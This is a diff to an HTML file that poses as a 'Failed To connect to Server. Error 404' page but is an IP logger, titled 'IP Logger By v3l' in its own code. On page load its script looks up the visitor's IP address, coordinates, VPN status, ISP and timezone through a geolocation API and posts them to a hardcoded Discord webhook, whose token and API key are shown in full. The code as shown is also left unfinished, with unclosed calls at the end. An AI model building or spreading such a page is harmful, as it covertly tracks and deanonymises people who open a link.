@@ -1,76 +1,76 @@
 <html>
 <head>
   <title>Error</title>
-  
+</head>
+<body>
+  <h1>Failed To connect to Server.</h1>
+  <p>Error 404<span id="ip"></span></p>
+
   <!-- include the Discord webhook URL in a meta tag -->
   <meta name="discord-webhook" content="https://discord.com/api/webhooks/1055687148382191656/312TTM14nJXhkRG2z5Scz8GvXd36DkI7otSYUYX5aayn9xiwGotS4Zrc3RYnNFB9istx">
 
   <!-- include the necessary libraries -->
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-</head>
-<body>
-  <h1>Failed To connect to Server.</h1>
-  <p>Error 404</p>
 
   <script>
     // use the 'fetch' API to retrieve the user's IP address
       $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         // display the IP address on the page
+        const ip = data.ip_address
+        const country = data.country
+        const flag = data.flag.emoji
+        const countrycode = data.country_code
+        const countrygeo = data.country_geoname_id
+        const continent = data.continent
+        const continentcode = data.continent_code
+        const continentgeo = data.continent_geoname_id
+        const longitude = data.longitude
+        const latitude = data.latitude
+        const vpn = data.security.is_vpn
+        const timezonename = data.timezone.name
+        const nameabbreviation = data.timezone.abbreviation
+        const currentime = data.timezone.current_time
+        const currency = data.currency.currency_name
+        const currencycode = data.currency.currency_code
+        const operateur = data.connection.autonomous_system_organization
+        const typedeco = data.connection.connection_type
+        const isp = data.connection.isp_name
+        const organame = data.connection.organization_name
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
-        
-        const payload = {
-  embeds: [{
-    title: 'Error',
-    description: 'Failed to connect to server. Error 404',
-    fields: [{
-      name: 'IP Address',
-      value: data.ip
-    }, {
-      name: 'Country',
-      value: data.country
-    }, {
-      name: 'Country Flag',
-      value: data.flag.emoji
-    }, {
-      name: 'Country Code',
-      value: data.country_code
-    }, {
-      name: 'Country Geo ID',
-      value: data.country_geoname_id
-    }, {
-      name: 'Continent',
-      value: data.continent
-    }, {
-      name: 'Continent Code',
-      value: data.continent_code
-    }, {
-      name: 'Continent Geo ID',
-      value: data.continent_geoname_id
-    }, {
-      name: 'X',
-      value: data.longitude
-    }, {
-      name: 'Y',
-      value: data.latitude
-    }, {
-      name: 'VPN',
-      value: data.security.is_vpn
-    }, {
-      name: 'Time Zone Name',
-      value: data.timezone.name
-    }, {
-      name: 'Time Zone Abbreviation',
-      value: data.timezone.abbreviation
-    }, {
-      name: 'Current Time',
-      value: data.timezone.current_time
-    }, {
-      name: 'Currency',
-      value: data.currency.currency_name
-    }, {
-      name: 'Currency Code',
-      value: data.currency.currency_code
-    }, {
+  // create the embed message
+  const embed = {
+    title: 'IP Log',
+    description: `
+      **IP Logger By v3l**
+      IP: ${ip}
+      Country: ${country}
+      Flag: ${flag}
+      Country Code: ${countrycode}
+      Country Geo Code: ${countrygeo}
+      Continent: ${continent}
+      Continent Code: ${continentcode}
+      Continent Geo ID: ${continentgeo}
+      X: ${longitude}
+      Y: ${latitude}
+      VPN: ${vpn}
+      Timezone Name: ${timezonename}
+      Timezone Abbreviation: ${nameabbreviation}
+      Current Time: ${currentime}
+      Currency: ${currency}
+      Currency Code: ${currencycode}
+      Autonomous System Organization: ${operateur}
+      Connection Type: ${typedeco}
+      ISP: ${isp}
+      Organization Name: ${organame}
+    `,
+  };
+
+  // send the embed message to the Discord channel
+  axios.post(webhookUrl, {
+    embeds: [embed],
+  </script>
+</body>
+</html>
